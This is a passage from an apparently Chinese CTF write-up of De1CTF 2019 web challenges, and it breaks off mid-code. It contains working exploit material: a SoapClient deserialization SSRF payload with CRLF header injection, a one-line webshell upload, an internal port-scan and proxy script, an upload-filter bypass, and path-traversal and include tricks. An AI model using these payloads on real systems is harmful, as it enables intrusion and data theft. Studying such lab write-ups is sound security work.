+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/81a32fb6bd2255087af30e3620d17430.png" alt=""></p>
+<p>查php手册可以看到，构造函数中有两个参数</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/2bc5cfefee26bb589760ac1fa8178867.png" alt=""></p>
+<p>第一个参数用来控制是否为wsdl模式，传入url为wsdl，传入null则不为wsdl模式</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/8cc4d1aec7d1edcd678ec4e4941ca126.png" alt=""></p>
+<p>当不为wsdl模式时，必须在option数组中设置location和uri。而且当为wsdl模式时会受到wsdl文件的限制（这是啥？？？），那自然要选择非wsdl模式</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/c12888d13d7edc7df76a8213e2a6f44a.png" alt=""></p>
+<p>在选择非wsdl模式后，有以上这几个参数可以放入option</p>
+<p>接下来尝试一下发个soap请求，看看具体的报文内容是什么样的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a = new SoapClient(null,array(&apos;location&apos; =&gt; &quot;http://ip:port&quot;,&apos;uri&apos; =&gt; &quot;123&quot;));</span><br><span class="line">$c = serialize($a);</span><br><span class="line">$k = unserialize($c);</span><br><span class="line">$k-&gt;getcountry();</span><br></pre></td></tr></table></figure>
+<p>这里要反序列化后调用个方法，不然发不出报文（不太懂为啥<br>然后监听一下端口</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/5d903f235ed05d312a2529d91e74fc74.png" alt=""></p>
+<p>可以看到soap发出的数据是以xml的方式发送的，但要post数据的话，需要将<code>Content-Type</code>设成<code>application/x-www-form-urlencoded</code><br>这里就要利用option中的user_agent参数，可以看到User-Agent是在Content-Type之上的，可以通过设置User-Agent往头部注入各种想要构造的信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a = new SoapClient(null,array(&apos;user_agent&apos; =&gt; &quot;test\r\nCookie:PHPSESSID=123456\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:100\r\n\rxxx=xxx&quot;&apos;location&apos; =&gt; &quot;http://ip:port&quot;,&apos;uri&apos; =&gt; &quot;123&quot;));</span><br><span class="line">$c = serialize($a);</span><br><span class="line">$k = unserialize($c);</span><br><span class="line">$k-&gt;getcountry();</span><br></pre></td></tr></table></figure>
+<p>这里往user_agent中放入了Cookie,Content-Type,Content-Length以及post的数据，由于User-Agent在上方，直接将下面的数据给覆盖掉</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/db9062d1057adf444ac5adf68d6f9473.png" alt=""></p>
+<p>再监听一次端口，可以看到对报文的注入成功了</p>
+<p>于是针对这题修改一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$location = &quot;http://127.0.0.1/index.php?action=login&quot;;</span><br><span class="line">$uri = &quot;http://127.0.0.1/&quot;;</span><br><span class="line">$soap = new SoapClient(null, array(&apos;user_agent&apos; =&gt; &quot;test\r\nCookie:PHPSESSID=tt98rf3ebp2tuivl0m973gjdr3\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:100\r\n\r\nusername=admin&amp;password=jaivypassword&amp;code=RTwZnHELJjCivxEsApoc&amp;xxx=&quot;,&apos;location&apos; =&gt; $location,&apos;uri&apos; =&gt; $uri));</span><br><span class="line">$s = serialize($soap);</span><br><span class="line">echo urlencode($s);</span><br></pre></td></tr></table></figure>
+<p>用xxx=将报文剩余部分作为xxx的值，以防万一<br>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">signature=1`,`O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A39%3A%22http%3A%2F%2F127.0.0.1%2Findex.php%3Faction%3Dlogin%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A189%3A%22test%0D%0ACookie%3APHPSESSID%3Djtgn11ggnfgr2g7rcfbhk2c894%0D%0AContent-Type%3Aapplication%2Fx-www-form-urlencoded%0D%0AContent-Length%3A100%0D%0A%0D%0Ausername%3Dadmin%26password%3Djaivypassword%26code%3DomYcKyq1Vplp4vmwBtiw%26xxx%3D%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D`)#&amp;mood=0</span><br></pre></td></tr></table></figure>
+<p>\n和\r不能少，不然会导致报文构造失败识别不到对应的数据，比赛时没注意到这么多导致有时能登录有时不能</p>
+<p>登录成功后进入publish</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/b5190a772f19034634daafbd97c6fc7d.png" alt=""></p>
+<p>传一句话木马扫了一下目录并没有找到flag，那应该是在内网的另一台主机上</p>
+<p>于是先执行ifconfig查一下ip段</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/1a2fcc5bb6aa4fc219da0a1d96c35837.png" alt=""></p>
+<p>可以看到，这个站在内网的网段是172.64.164.0，于是传一个扫描脚本上去扫</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">set_time_limit(0);//设置程序执行时间</span><br><span class="line">ob_implicit_flush(True);</span><br><span class="line">ob_end_flush();</span><br><span class="line">$url = isset($_REQUEST[&apos;url&apos;])?$_REQUEST[&apos;url&apos;]:null;</span><br><span class="line"></span><br><span class="line">/*端口扫描代码*/</span><br><span class="line">function check_port($ip,$port,$timeout=0.1)&#123;</span><br><span class="line">	$conn = @fsockopen($ip, $port, $errno, $errstr, $timeout);</span><br><span class="line">	if($conn)&#123;</span><br><span class="line">		fclose($conn);</span><br><span class="line">		return true;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function scanip($ip,$timeout,$portarr)&#123;</span><br><span class="line">	foreach($portarr as $port)&#123;</span><br><span class="line">		if(check_port($ip,$port,$timeout=0.1)==True)&#123;</span><br><span class="line">			echo &apos;Port: &apos;.$port.&apos; is open&lt;br/&gt;&apos;;</span><br><span class="line">			@ob_flush();</span><br><span class="line">			@flush();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &apos;&lt;html&gt;</span><br><span class="line">	&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="line">	&lt;input type=&quot;text&quot; name=&quot;startip&quot; value=&quot;Start IP&quot; /&gt;</span><br><span class="line">	&lt;input type=&quot;text&quot; name=&quot;endip&quot; value=&quot;End IP&quot; /&gt;</span><br><span class="line">	&lt;input type=&quot;text&quot; name=&quot;port&quot; value=&quot;80,8080,8888,1433,3306&quot; /&gt;</span><br><span class="line">	Timeout&lt;input type=&quot;text&quot; name=&quot;timeout&quot; value=&quot;10&quot; /&gt;&lt;br/&gt;</span><br><span class="line">	&lt;button type=&quot;submit&quot; name=&quot;submit&quot;&gt;Scan&lt;/button&gt;</span><br><span class="line">	&lt;/form&gt;</span><br><span class="line">	&lt;/html&gt;</span><br><span class="line">&apos;;</span><br><span class="line"> </span><br><span class="line">if(isset($_POST[&apos;startip&apos;])&amp;&amp;isset($_POST[&apos;endip&apos;])&amp;&amp;isset($_POST[&apos;port&apos;])&amp;&amp;isset($_POST[&apos;timeout&apos;]))&#123;</span><br><span class="line">	$startip=$_POST[&apos;startip&apos;];</span><br><span class="line">	$endip=$_POST[&apos;endip&apos;];</span><br><span class="line">	$timeout=$_POST[&apos;timeout&apos;];</span><br><span class="line">	$port=$_POST[&apos;port&apos;];</span><br><span class="line">	$portarr=explode(&apos;,&apos;,$port);</span><br><span class="line">	$siparr=explode(&apos;.&apos;,$startip);</span><br><span class="line">	$eiparr=explode(&apos;.&apos;,$endip);</span><br><span class="line">	$ciparr=$siparr;</span><br><span class="line">	if(count($ciparr)!=4||$siparr[0]!=$eiparr[0]||$siparr[1]!=$eiparr[1])&#123;</span><br><span class="line">		exit(&apos;IP error: Wrong IP address or Trying to scan class A address&apos;);</span><br><span class="line">	&#125;</span><br><span class="line">	if($startip==$endip)&#123;</span><br><span class="line">		echo &apos;Scanning IP &apos;.$startip.&apos;&lt;br/&gt;&apos;;</span><br><span class="line">		@ob_flush();</span><br><span class="line">		@flush();</span><br><span class="line">		scanip($startip,$timeout,$portarr);</span><br><span class="line">		@ob_flush();</span><br><span class="line">		@flush();</span><br><span class="line">		exit();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if($eiparr[3]!=255)&#123;</span><br><span class="line">		$eiparr[3]+=1;</span><br><span class="line">	&#125;</span><br><span class="line">	while($ciparr!=$eiparr)&#123;</span><br><span class="line">		$ip=$ciparr[0].&apos;.&apos;.$ciparr[1].&apos;.&apos;.$ciparr[2].&apos;.&apos;.$ciparr[3];</span><br><span class="line">		echo &apos;&lt;br/&gt;Scanning IP &apos;.$ip.&apos;&lt;br/&gt;&apos;;</span><br><span class="line">		@ob_flush();</span><br><span class="line">		@flush();</span><br><span class="line">		scanip($ip,$timeout,$portarr);</span><br><span class="line">		$ciparr[3]+=1;</span><br><span class="line"></span><br><span class="line">		if($ciparr[3]&gt;255)&#123;</span><br><span class="line">			$ciparr[2]+=1;</span><br><span class="line">			$ciparr[3]=0;</span><br><span class="line">		&#125;</span><br><span class="line">		if($ciparr[2]&gt;255)&#123;</span><br><span class="line">			$ciparr[1]+=1;</span><br><span class="line">			$ciparr[2]=0;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*内网代理代码*/</span><br><span class="line"></span><br><span class="line">function getHtmlContext($url)&#123;</span><br><span class="line">	$ch = curl_init();</span><br><span class="line">	curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">	curl_setopt($ch, CURLOPT_HEADER, TRUE);//表示需要response header</span><br><span class="line">	curl_setopt($ch, CURLOPT_NOBODY, FALSE); //表示需要response body</span><br><span class="line">	curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);</span><br><span class="line">	curl_setopt($ch, CURLOPT_TIMEOUT, 120);</span><br><span class="line">	$result = curl_exec($ch);</span><br><span class="line">	global $header;</span><br><span class="line">	if($result)&#123;</span><br><span class="line">		$headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);</span><br><span class="line">		$header = explode(&quot;\r\n&quot;,substr($result, 0, $headerSize));</span><br><span class="line">		$body = substr($result, $headerSize);</span><br><span class="line">	&#125;</span><br><span class="line">	if (curl_getinfo($ch, CURLINFO_HTTP_CODE) == &apos;200&apos;)&#123;</span><br><span class="line">		return $body;</span><br><span class="line">	&#125;</span><br><span class="line">	if (curl_getinfo($ch, CURLINFO_HTTP_CODE) == &apos;302&apos;) &#123;</span><br><span class="line">		$location = getHeader(&quot;Location&quot;);</span><br><span class="line">		if(strpos(getHeader(&quot;Location&quot;),&apos;http://&apos;) == false)&#123;</span><br><span class="line">			$location = getHost($url).$location;</span><br><span class="line">		&#125;</span><br><span class="line">		return getHtmlContext($location);</span><br><span class="line">	&#125;</span><br><span class="line">    return NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getHost($url)&#123;</span><br><span class="line">	preg_match(&quot;/^(http:\/\/)?([^\/]+)/i&quot;,$url, $matches);</span><br><span class="line">	return $matches[0];</span><br><span class="line">&#125;</span><br><span class="line">function getCss($host,$html)&#123;</span><br><span class="line">	preg_match_all(&quot;/&lt;link[\s\S]*?href=[&apos;\&quot;](.*?[.]css.*?)[\&quot;&apos;][\s\S]*?&gt;/i&quot;,$html, $matches);</span><br><span class="line">	foreach($matches[1] as $v)&#123;</span><br><span class="line">		$cssurl = $v;</span><br><span class="line">		if(strpos($v,&apos;http://&apos;) == false)&#123;</span><br><span class="line">			$cssurl = $host.&quot;/&quot;.$v;</span><br><span class="line">		&#125;</span><br><span class="line">		$csshtml = &quot;&lt;style&gt;&quot;.file_get_contents($cssurl).&quot;&lt;/style&gt;&quot;;</span><br><span class="line">		$html .= $csshtml;</span><br><span class="line">	&#125;</span><br><span class="line">	return $html;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($url != null)&#123;</span><br><span class="line">	$host = getHost($url);</span><br><span class="line">	echo getCss($host,getHtmlContext($url));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这个脚本是在网上随便找的，凑合着用= =</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/4853a2c99d5a194c8733fc77a181e567.png" alt=""></p>
+<p>扫到了好几个地址80端口开启，可能是BUU上其它题的端口？访问下.7附近的试试看先<br>在.8成功访问到，是个上传页面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$sandbox = &apos;/var/sandbox/&apos; . md5(&quot;prefix&quot; . $_SERVER[&apos;REMOTE_ADDR&apos;]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line"></span><br><span class="line">if($_FILES[&apos;file&apos;][&apos;name&apos;])&#123;</span><br><span class="line">    $filename = !empty($_POST[&apos;file&apos;]) ? $_POST[&apos;file&apos;] : $_FILES[&apos;file&apos;][&apos;name&apos;];</span><br><span class="line">    if (!is_array($filename)) &#123;</span><br><span class="line">        $filename = explode(&apos;.&apos;, $filename);</span><br><span class="line">    &#125;</span><br><span class="line">    $ext = end($filename);</span><br><span class="line">    if($ext==$filename[count($filename) - 1])&#123;</span><br><span class="line">        die(&quot;try again!!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $new_name = (string)rand(100,999).&quot;.&quot;.$ext;</span><br><span class="line">    move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;],$new_name);</span><br><span class="line">    $_ = $_POST[&apos;hello&apos;];</span><br><span class="line">    if(@substr(file($_)[0],0,6)===&apos;@&lt;?php&apos;)&#123;</span><br><span class="line">        if(strpos($_,$new_name)===false) &#123;</span><br><span class="line">            include($_);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;you can do it!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink($new_name);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>要上传文件首先要先绕过这里。这里当filename非数组时，以.将filename分割，然后取数组最后一个与下标为长度减一的值比较，相等直接die<br>我们知道，当一个数组为关联数组时，<code>count(array)-1</code>获得的下标是无法得到有效的值的。这里也是利用这点，我们处理一下报文，让文件名为一个关联数组，就能让<code>$filename[count($filename) - 1]</code>的值无效，而<code>end($filename)</code>依旧会取到最后一个数据，从而绕过这里</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------1290214079214</span><br><span class="line">Content-Disposition: form-data; name=&quot;file[b]&quot;</span><br><span class="line"></span><br><span class="line">xx</span><br><span class="line">-----------------------------1290214079214</span><br><span class="line">Content-Disposition: form-data; name=&quot;file[a]&quot;</span><br><span class="line"></span><br><span class="line">xxxx</span><br><span class="line">-----------------------------1290214079214--</span><br></pre></td></tr></table></figure>
+<p>大概像这样<br>还有一种解法是php并不是按数字排序的，所以也可以传一个[‘1’=&gt;’xxx’,’0’=&gt;’xx’]进行绕过</p>
+<p>然后是下半部分，要想办法阻止unlink<br>这里有几种解法</p>
+<p>利用php7的文件包含漏洞，当<code>include(&#39;php://filter/string.strip_tags/resource=/etc/passwd&#39;)</code>时，php就会崩溃，继而不执行unlink</p>
+<p>利用<code>include(&#39;index.php&#39;)</code>包含自身，让php死循环崩溃。这样就能让文件保留在服务器上，然后再去跑new_name的值就行</p>
+<p>还有一种方法是，既然ext的值是可以控制的，那我们可以构造一下，让ext为<code>php/../xx.php</code>，这样我们就能够控制文件名，不需去爆破，直接在unlink前include就能获得内容</p>
+<p>这里用最后一种解法，报文大概像这样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundary7MA4YWxkTrZu0gW</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;flag.php&quot;</span><br><span class="line">Content-Type: false</span><br><span class="line"></span><br><span class="line">@&lt;?php echo 1;</span><br><span class="line">------WebKitFormBoundary7MA4YWxkTrZu0gW</span><br><span class="line">Content-Disposition: form-data; name=&quot;hello&quot;</span><br><span class="line"></span><br><span class="line">flag.php</span><br><span class="line">------WebKitFormBoundary7MA4YWxkTrZu0gW</span><br><span class="line">Content-Disposition: form-data; name=&quot;file[2]&quot;</span><br><span class="line"></span><br><span class="line">222</span><br><span class="line">------WebKitFormBoundary7MA4YWxkTrZu0gW</span><br><span class="line">Content-Disposition: form-data; name=&quot;file[1]&quot;</span><br><span class="line"></span><br><span class="line">111</span><br><span class="line">------WebKitFormBoundary7MA4YWxkTrZu0gW</span><br><span class="line">Content-Disposition: form-data; name=&quot;file[0]&quot;</span><br><span class="line"></span><br><span class="line">/../flag.php</span><br><span class="line">------WebKitFormBoundary7MA4YWxkTrZu0gW</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">Submit</span><br><span class="line">------WebKitFormBoundary7MA4YWxkTrZu0gW--</span><br></pre></td></tr></table></figure>
+<p>然后借用一下大佬们的脚本改改</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$curl = curl_init();</span><br><span class="line"></span><br><span class="line">curl_setopt_array($curl, array(</span><br><span class="line">  CURLOPT_URL =&gt; &quot;http://172.64.72.8&quot;,</span><br><span class="line">  CURLOPT_RETURNTRANSFER =&gt; true,</span><br><span class="line">  CURLOPT_ENCODING =&gt; &quot;&quot;,</span><br><span class="line">  CURLOPT_MAXREDIRS =&gt; 10,</span><br><span class="line">  CURLOPT_TIMEOUT =&gt; 30,</span><br><span class="line">  CURLOPT_HTTP_VERSION =&gt; CURL_HTTP_VERSION_1_1,</span><br><span class="line">  CURLOPT_CUSTOMREQUEST =&gt; &quot;POST&quot;,</span><br><span class="line">  CURLOPT_POSTFIELDS =&gt; &quot;------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\&quot;file\&quot;; filename=\&quot;flag.php\&quot;\r\nContent-Type: false\r\n\r\n@&lt;?php echo 1;\r\n\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\&quot;hello\&quot;\r\n\r\nflag.php\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\&quot;file[2]\&quot;\r\n\r\n222\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\&quot;file[1]\&quot;\r\n\r\n111\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\&quot;file[0]\&quot;\r\n\r\n/../flag.php\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\&quot;submit\&quot;\r\n\r\nSubmit\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--&quot;,</span><br><span class="line">  CURLOPT_HTTPHEADER =&gt; array(</span><br><span class="line">    &quot;Postman-Token: a23f25ff-a221-47ef-9cfc-3ef4bd560c22&quot;,</span><br><span class="line">    &quot;cache-control: no-cache&quot;,</span><br><span class="line">    &quot;content-type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW&quot;</span><br><span class="line">  ),</span><br><span class="line">));</span><br><span class="line"></span><br><span class="line">$response = curl_exec($curl);</span><br><span class="line">$err = curl_error($curl);</span><br><span class="line"></span><br><span class="line">curl_close($curl);</span><br><span class="line"></span><br><span class="line">if ($err) &#123;</span><br><span class="line">  echo &quot;cURL Error #:&quot; . $err;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  echo $response;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后找呀找呀，最终在etc中找到了flag</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/3901abb2497395f9f1a8852cf20fd1bd.png" alt=""></p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/949b8b4e604a1f5f12555b95e8b2eee6.png" alt=""></p>
+<p>【我也想用find，然而会超时</p>
+<h2 id="Giftbox"><a href="#Giftbox" class="headerlink" title="Giftbox"></a>Giftbox</h2><p>这题当时打开没什么想法就放弃了，现在想想至少也要做到sql注入哪里才对</p>
+<p>打开是个很漂亮的前端页面，等了一下后提示输入help<br><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/03aee1198226ff7f4e30fce1e25b3df3.png" alt=""></p>
+<p>提示了这几个命令，于是ls一下</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/ebeb5da38590ab2a2c353744befcdec1.png" alt=""></p>
+<p>读一下这几个</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/71ee0536c0cf791ac2f3759c5b9ce0cb.png" alt=""></p>
+<p>只有usage.md能读出来，其它两个看起来像文件夹然而进不去</p>
+<p>接着login登不了于是抓下包</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/78813631cfe960831ecac95cabcb91a5.png" alt=""></p>
+<p>尝试发包但响应totp error<br>而直接通过浏览器发送的则正常返回</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/7d6dc3e1e0a771f47dd777dfa592aedb.png" alt=""></p>
+<p>于是去看一下totp这个参数是做什么的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url: host + &apos;/shell.php?a=&apos;+encodeURIComponent(input)+&apos;&amp;totp=&apos; + new TOTP(&quot;GAXG24JTMZXGKZBU&quot;,8).genOTP(),</span><br></pre></td></tr></table></figure>
+<p>可以看到totp是由TOTP类生成<br>不太清楚totp是啥，于是查了一下后大概知道，totp则是基于时间的一次性口令。totp需要客户端与服务器时钟同步，同时共享密钥，否则会使客户端与服务器计算出来的动态口令不同验证失败。不过可以通过设置timeStep防止客户端与服务器由于难以避免的时间差导致的验证口令错误，但设置过大的话就失去了动态口令的意义</p>
+<p>生成口令的算法是：<br>TOTP =Truncate(HMAC-SHA-1(K, (T - T0) / X))<br>这里的几个参数的意义是：<br>K是共享密钥（令牌种子）<br>T是一个整数，代表当前时间<br>T0是一个整数，代表一个时间点，一般为0<br>X口令变化周期，单位为秒，30秒或者60秒</p>
+<p>那么前面那串GAXG24JTMZXGKZBU应该就是key了，8不清楚是什么试试看</p>
+<p><img src="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/d70d856037b1e42dc486926bc627b31c.png" alt=""></p>
+<p>可以看出是设置口令的长度<br>那还有X和T0这两个参数值要获得，于是去看看totop.min.js</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">n(e, [</span><br><span class="line">       &#123;</span><br><span class="line">         key: &apos;genOTP&apos;,</span><br><span class="line">         value: function () &#123;</span><br><span class="line">           var t = arguments.length &gt; 0 &amp;&amp; void 0 !== arguments[0] ? arguments[0] : 5,</span><br><span class="line">           r = arguments.length &gt; 1 &amp;&amp; void 0 !== arguments[1] ? arguments[1] : 0,</span><br><span class="line">           n = Math.floor((Date.now() / 1000 - r) / t);</span><br><span class="line">           return function t(e, r, n) &#123;</span><br><span class="line">             null === e &amp;&amp; (e = Function.prototype);</span><br><span class="line">             var o = Object.getOwnPropertyDescriptor(e, 